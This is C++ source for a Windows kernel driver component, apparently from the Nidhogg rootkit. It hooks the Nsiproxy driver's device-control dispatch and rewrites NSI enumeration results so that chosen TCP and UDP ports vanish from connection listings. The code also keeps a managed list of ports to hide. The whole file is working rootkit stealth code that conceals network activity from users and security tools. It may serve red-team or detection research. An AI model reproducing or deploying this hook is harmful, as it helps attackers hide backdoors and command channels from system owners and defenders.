#include "pch.h"
#include "NetworkUtils.hpp"

NetworkUtils::NetworkUtils() {
	this->CallbackActivated = false;
	OriginalNsiDispatchAddress = NULL;
	this->HiddenPortsList.LastIndex = 0;
	this->HiddenPortsList.PortsCount = 0;
	memset(&this->HiddenPortsList.Ports, 0, MAX_PORTS * sizeof(HiddenPort));
	this->HiddenPortsList.Lock.Init();
}

NetworkUtils::~NetworkUtils() {
	// AutoLock locker(this->HiddenPortsList.Lock);
	
	if (this->CallbackActivated) {
		this->CallbackActivated = false;
		UninstallNsiHook();
		this->OriginalNsiDispatchAddress = NULL;
	}
	ClearHiddenPortsList();
}

/*
* Description:
* InstallNsiHook is responsible to hook Nsi's device io control handler.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @status [NTSTATUS] -- Whether installed or not.
*/
NTSTATUS NetworkUtils::InstallNsiHook() {
	UNICODE_STRING driverName;
	PDRIVER_OBJECT driverObject = nullptr;
	NTSTATUS status = STATUS_SUCCESS;

	RtlInitUnicodeString(&driverName, L"\\Driver\\Nsiproxy");
	status = ObReferenceObjectByName(&driverName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID*)&driverObject);

	if (!NT_SUCCESS(status))
		return status;

	this->OriginalNsiDispatchAddress = (PVOID)InterlockedExchange64((LONG64*)&driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL], (LONG64)HookedNsiDispatch);
	this->CallbackActivated = true;

	ObDereferenceObject(driverObject);
	return status;
}

/*
* Description:
* UninstallNsiHook is responsible to unhook Nsi's device io control handler.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @status [NTSTATUS] -- Whether unhooked or not.
*/
NTSTATUS NetworkUtils::UninstallNsiHook() {
	UNICODE_STRING driverName;
	PDRIVER_OBJECT driverObject = nullptr;
	NTSTATUS status = STATUS_SUCCESS;

	RtlInitUnicodeString(&driverName, L"\\Driver\\Nsiproxy");
	status = ObReferenceObjectByName(&driverName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID*)&driverObject);

	if (!NT_SUCCESS(status))
		return status;

	InterlockedExchange64((LONG64*)&driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL], (LONG64)this->OriginalNsiDispatchAddress);
	this->OriginalNsiDispatchAddress = nullptr;
	this->CallbackActivated = false;

	ObDereferenceObject(driverObject);
	return status;
}

/*
* Description:
* NsiIrpComplete is responsible to handle IRP completion for the hooked Nsi dispatch function.
*
* Parameters:
* @DeviceObject [PDEVICE_OBJECT] -- Driver device object.
* @Irp			[PIRP]			 -- Pointer to the Irp.
* @Context		[PVOID]			 -- Irp context.
*
* Returns:
* @status [NTSTATUS] -- Depends on the status of the previous function.
*/
NTSTATUS NsiIrpComplete(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context) {
	SIZE_T entriesHidden = 0;
	HookedCompletionRoutine* context = (HookedCompletionRoutine*)Context;

	if (NT_SUCCESS(Irp->IoStatus.Status)) {
		do {
			PNSI_PARAM nsiParameter = (PNSI_PARAM)Irp->UserBuffer;

			if (VALID_USERMODE_MEMORY((ULONGLONG)nsiParameter)) {
				if (!NT_SUCCESS(ProbeAddress(nsiParameter, sizeof(PNSI_PARAM), sizeof(PNSI_PARAM), STATUS_UNSUCCESSFUL)))
					break;
			}
			else if (!VALID_KERNELMODE_MEMORY((ULONGLONG)nsiParameter) || !nsiParameter)
				break;

			if (nsiParameter->Entries && nsiParameter->EntrySize > 0) {
				PNSI_TABLE_TCP_ENTRY tcpEntries = (PNSI_TABLE_TCP_ENTRY)nsiParameter->Entries;
				PNSI_UDP_ENTRY udpEntries = (PNSI_UDP_ENTRY)nsiParameter->Entries;
				PNSI_STATUS_ENTRY statusEntries = (PNSI_STATUS_ENTRY)nsiParameter->StatusEntries;
				PNSI_PROCESS_ENTRY processEntries = (PNSI_PROCESS_ENTRY)nsiParameter->ProcessEntries;

				auto HidePort = [](PVOID Entries, PNSI_PARAM nsiParameter, PNSI_STATUS_ENTRY statusEntries,
					PNSI_PROCESS_ENTRY processEntries, SIZE_T i) {
						USHORT entriesIndex = i + 1;

						if (!&((PUCHAR)Entries)[entriesIndex])
							entriesIndex = i - 1;

						RtlMoveMemory(&((PUCHAR)Entries)[i], &((PUCHAR)Entries)[entriesIndex], (nsiParameter->Count - entriesIndex) * nsiParameter->EntrySize);

						if (statusEntries) {
							entriesIndex = i + 1;

							if (!&statusEntries[entriesIndex])
								entriesIndex = i - 1;
							
							RtlMoveMemory(&statusEntries[i], &statusEntries[entriesIndex], (nsiParameter->Count - entriesIndex) * sizeof(NSI_STATUS_ENTRY));
						}

						if (processEntries) {
							entriesIndex = i + 1;

							if (!&processEntries[entriesIndex])
								entriesIndex = i - 1;

							RtlMoveMemory(&processEntries[i], &processEntries[entriesIndex], (nsiParameter->Count - entriesIndex) * nsiParameter->ProcessEntrySize);
						}
					};

				for (SIZE_T i = 0; i < nsiParameter->Count; i++) {
					if (nsiParameter->Type == COMUNICATION_TYPE::TCP) {

						// Edge case of somehow the entries list is empty.
						if (!tcpEntries)
							continue;

						HiddenPort hiddenPort{};
						hiddenPort.Port = htohs(tcpEntries[i].Local.Port);
						hiddenPort.Type = PortType::TCP;
						hiddenPort.Remote = false;

						if (NidhoggNetworkUtils->FindHiddenPort(hiddenPort)) {
							__try {
								HidePort(tcpEntries, nsiParameter, statusEntries, processEntries, i);
							}
							__except (EXCEPTION_EXECUTE_HANDLER) {}
						}

						hiddenPort.Port = htohs(tcpEntries[i].Remote.Port);
						hiddenPort.Type = PortType::TCP;
						hiddenPort.Remote = true;

						if (NidhoggNetworkUtils->FindHiddenPort(hiddenPort)) {
							__try {
								HidePort(tcpEntries, nsiParameter, statusEntries, processEntries, i);
							}
							__except (EXCEPTION_EXECUTE_HANDLER) {}
						}
					}
					else if (nsiParameter->Type == COMUNICATION_TYPE::UDP) {
						// Edge case of somehow the entries list is empty.
						if (!udpEntries)
							continue;

						HiddenPort hiddenPort{};
						hiddenPort.Port = htohs(udpEntries[i].Port);
						hiddenPort.Type = PortType::UDP;

						if (NidhoggNetworkUtils->FindHiddenPort(hiddenPort)) {
							__try {
								HidePort(udpEntries, nsiParameter, statusEntries, processEntries, i);
							}
							__except (EXCEPTION_EXECUTE_HANDLER) {}
						}
					}
				}

				nsiParameter->Count -= entriesHidden;
			}
		} while (false);
	}
	
	if (context->OriginalCompletionRoutine) {
		PIO_COMPLETION_ROUTINE originalRoutine = context->OriginalCompletionRoutine;
		PVOID originalContext = NULL;

		if (context->OriginalContext)
			originalContext = context->OriginalContext;

		ExFreePoolWithTag(Context, DRIVER_TAG);
		return originalRoutine(DeviceObject, Irp, originalContext);
	}

	ExFreePoolWithTag(Context, DRIVER_TAG);
	return STATUS_SUCCESS;
}

/*
* Description:
* HookedNsiDispatch is responsible to handle IOCTLs for Nsi.
*
* Parameters:
* @DeviceObject [PDEVICE_OBJECT] -- Driver device object.
* @Irp			[PIRP]			 -- Pointer to the Irp.
*
* Returns:
* @status [NTSTATUS] -- Whether the operation was successful or not.
*/
NTSTATUS HookedNsiDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	auto stack = IoGetCurrentIrpStackLocation(Irp);

	if (stack->Parameters.DeviceIoControl.IoControlCode == IOCTL_NSI_ENUMERATE_OBJECTS_ALL_PARAMETERS) {
		HookedCompletionRoutine* context = (HookedCompletionRoutine*)AllocateMemory(sizeof(HookedCompletionRoutine), false);

		if (context) {
			context->OriginalCompletionRoutine = stack->CompletionRoutine;
			context->OriginalContext = stack->Context;
			stack->Context = context;
			stack->CompletionRoutine = NsiIrpComplete;
			stack->Control |= SL_INVOKE_ON_SUCCESS;
		}
	}

	return ((PDRIVER_DISPATCH)NidhoggNetworkUtils->GetOriginalCallback())(DeviceObject, Irp);
}

/*
* Description:
* FindHiddenPort is responsible for searching if a port exists in the hidden ports list.
*
* Parameters:
* @port   [HiddenPort] -- Port to find.
*
* Returns:
* @status [bool]   -- Whether found or not.
*/
bool NetworkUtils::FindHiddenPort(HiddenPort port) {
	AutoLock locker(this->HiddenPortsList.Lock);

	for (USHORT i = 0; i <= this->HiddenPortsList.LastIndex; i++) {
		if (this->HiddenPortsList.Ports[i].Port == port.Port && this->HiddenPortsList.Ports[i].Type == port.Type) {
			if (port.Type == PortType::TCP && this->HiddenPortsList.Ports[i].Type == PortType::TCP) {
				if (this->HiddenPortsList.Ports[i].Remote != port.Remote)
					continue;
			}
			return true;
		}
	}
	return false;
}

/*
* Description:
* AddHiddenPort is responsible for adding a port to the hidden ports list.
*
* Parameters:
* @port   [HiddenPort] -- Port to add.
*
* Returns:
* @status [bool]   -- Whether successfully added or not.
*/
bool NetworkUtils::AddHiddenPort(HiddenPort port) {
	AutoLock locker(this->HiddenPortsList.Lock);

	for (USHORT i = 0; i < MAX_PORTS; i++)
		if (this->HiddenPortsList.Ports[i].Port == 0) {
			this->HiddenPortsList.Ports[i].Port = port.Port;
			this->HiddenPortsList.Ports[i].Type = port.Type;
			this->HiddenPortsList.Ports[i].Remote = port.Remote;

			if (i > this->HiddenPortsList.LastIndex)
				this->HiddenPortsList.LastIndex = i;

			this->HiddenPortsList.PortsCount++;
			return true;
		}
	return false;
}

/*
* Description:
* RemoveHiddenPort is responsible for removing a port from the hidden ports list.
*
* Parameters:
* @port   [HiddenPort] -- Port to remove.
*
* Returns:
* @status [bool]   -- Whether successfully removed or not.
*/
bool NetworkUtils::RemoveHiddenPort(HiddenPort port) {
	USHORT newLastIndex = 0;
	AutoLock locker(this->HiddenPortsList.Lock);

	for (USHORT i = 0; i <= this->HiddenPortsList.LastIndex; i++) {
		if (this->HiddenPortsList.Ports[i].Port != 0) {
			if (this->HiddenPortsList.Ports[i].Port == port.Port && this->HiddenPortsList.Ports[i].Type == port.Type) {
				if (this->HiddenPortsList.Ports[i].Type == PortType::TCP) {
					if (this->HiddenPortsList.Ports[i].Remote != port.Remote) {
						newLastIndex = i;
						continue;
					}
				}

				if (i == this->HiddenPortsList.LastIndex)
					this->HiddenPortsList.LastIndex = newLastIndex;
				this->HiddenPortsList.Ports[i].Port = 0;
				this->HiddenPortsList.PortsCount--;
				return true;
			}
			else
				newLastIndex = i;
		}
	}
	return false;
}

/*
* Description:
* ClearHiddenPortsList is responsible for clearing the hidden ports list.
*
* Parameters:
* There are no parameters.
*
* Returns:
* There is no return value.
*/
void NetworkUtils::ClearHiddenPortsList() {
	AutoLock locker(this->HiddenPortsList.Lock);

	memset(&this->HiddenPortsList.Ports, 0, MAX_PORTS * sizeof(HiddenPort));
	this->HiddenPortsList.LastIndex = 0;
	this->HiddenPortsList.PortsCount = 0;
}

/*
* Description:
* QueryHiddenPorts is responsible for getting the hidden ports.
*
* Parameters:
* @outputHiddenPorts   [OutputHiddenPorts*] -- List of hidden ports to fill.
*
* Returns:
* There is no return value.
*/
void NetworkUtils::QueryHiddenPorts(OutputHiddenPorts* outputHiddenPorts) {
	USHORT outputIndex = 0;

	AutoLock locker(this->HiddenPortsList.Lock);
	outputHiddenPorts->PortsCount = this->HiddenPortsList.PortsCount;

	for (USHORT i = 0; i <= this->HiddenPortsList.LastIndex; i++) {
		if (this->HiddenPortsList.Ports[i].Port != 0) {
			outputHiddenPorts->Ports[outputIndex].Port = this->HiddenPortsList.Ports[i].Port;
			outputHiddenPorts->Ports[outputIndex].Type = this->HiddenPortsList.Ports[i].Type;
			outputIndex++;
		}
	}
}